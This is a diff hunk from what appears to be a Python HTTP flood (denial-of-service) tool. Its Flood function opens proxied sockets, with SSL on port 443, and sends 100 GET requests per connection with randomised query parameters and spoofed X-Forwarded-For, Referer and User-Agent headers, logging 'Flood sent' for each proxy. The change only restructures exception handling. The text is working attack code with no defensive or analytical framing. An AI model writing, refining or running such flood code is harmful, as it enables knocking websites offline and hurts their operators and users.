@@ -103,15 +103,12 @@ def Flood(indexPicker):
             if targetPort == 443:
                 sslContext = ssl.SSLContext()
                 s = sslContext.wrap_socket(s, server_hostname=targetHost)
-            try:
-                for _ in range(100):
-                    valueParams = f"?{rC(queryParams)}={rI(1, 65535)}&{rC(queryParams)}={rI(1, 65535)}"
-                    floodHeader = f"GET {targetPath}{valueParams} HTTP/1.1\r\nHost: {targetHost}\r\n" + Connection + Accept + Referer + X_Forwarded_For + User_Agent
-                    s.send(str(floodHeader).encode())
-                s.close()
-                print("Flood sent " + proxy[0] + ":" + proxy[1])
-            except socks.error:
-                time.sleep(.1)
+            for _ in range(100):
+                valueParams = f"?{rC(queryParams)}={rI(1, 65535)}&{rC(queryParams)}={rI(1, 65535)}"
+                floodHeader = f"GET {targetPath}{valueParams} HTTP/1.1\r\nHost: {targetHost}\r\n" + Connection + Accept + Referer + X_Forwarded_For + User_Agent
+                s.send(str(floodHeader).encode())
+            s.close()
+            print("Flood sent " + proxy[0] + ":" + proxy[1])
         except:
             pass
  
